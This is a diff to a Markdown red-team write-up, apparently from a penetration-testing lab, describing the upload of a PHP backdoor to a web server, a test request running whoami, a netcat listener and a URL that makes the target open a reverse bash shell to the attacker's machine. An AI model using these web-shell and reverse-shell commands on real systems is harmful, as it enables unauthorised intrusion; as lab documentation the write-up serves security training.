@@ -137,7 +137,9 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - We will exploit the insecure webserver and upload a backdoor to give us a bash shell on the target machine
         - We take this [exploit.sh](exploit.sh) and run it to place a backdoor onto the target webserver
-      - Once the file is run we than start a netcat listener on the kali machine
+        - To test that the exploit worked we visit `view-source:http://192.168.1.115/backdoor.php?cmd=whoami`
+        - ![Target 2 Exploit Test](Images/Target2ExploitTest.png "Target 2 Exploit Test")
+      - Next step is starting a netcat listener on the kali machine
         - `nc -lnvp 4444`
       - Than we use the backdoor file to connect the target computer to our kali machine by visiting this url
         - `http://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
